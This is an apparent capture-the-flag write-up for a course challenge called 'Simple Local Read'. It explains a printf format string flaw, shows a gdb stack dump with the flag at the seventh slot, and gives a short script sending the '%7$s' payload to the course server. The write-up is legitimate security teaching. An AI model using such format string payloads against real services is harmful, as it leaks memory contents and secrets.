# Challenge `Simple Local Read` writeup

- Vulnerability:
  - _Endpoint has a **format string** vulnerability_
- Where:
  - _`printf` endpoint_
- Impact:
  - _Allows to **read the stack values** without having the authority to by using the (vulnerable) printf function in the server's code_

## Steps to reproduce

First we need to open a session in the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22190`. After the session is established we can now start plotting what to do.

By analysing the source code provided, we can see that there is a buffer being used to store the input of the user. The buffer has a size of 128, and afterwards, in the function `vuln`, is printed. We can see that the `printf` function is being used to print the buffer, and it has a format string vulnerability. 

This means that we can use the `%08x.` character to print the stack values. The value we need is possibly already in the stack. To check it we used the gdb debugger with the corresponding **binary** file.
By disassembling the `vuln` function, we decided to use the memory address of the printf to make a breakpoint. This way, we can see the stack values when the breakpoint is reached. We obtained the following stack:

```bash
[------------------------------------stack-------------------------------------]
0000| 0xffffce80 --> 0x804a060 --> 0xa7825 ('\n')
0004| 0xffffce84 --> 0xf7fdb8d0 (pop    edx)
0008| 0xffffce88 --> 0xffffcea8 --> 0xffffceb8 --> 0x0 
0012| 0xffffce8c --> 0x80485b8 (<vuln+11>:	mov    DWORD PTR [ebp-0xc],eax)
0016| 0xffffce90 --> 0xf7f9dff4 --> 0x21cd8c 
0020| 0xffffce94 --> 0x8048610 (<__libc_csu_init>:	push   ebp)
0024| 0xffffce98 --> 0xf7ffcb80 --> 0x0 
0028| 0xffffce9c --> 0x804b1a0 ("STT{The_correct_flag_is_on_the_server}")           # its here (seventh place)
[------------------------------------------------------------------------------]
```

Looking at the stack the flag is in the seventh place, so we can use the `%7$s` to obtain it. The request we used and its corresponding payload was:

```python
msg= (b"%7$s")
r.sendline(msg)
print(f"Flag: {r.recvall().decode()}")
r.close()
```

Now, we can see that the server returned the `flag`. This means that we have successfully exploited the vulnerability and achieved our objective.

## Script

The script used can be found [here](simple_local_read_poc.py)
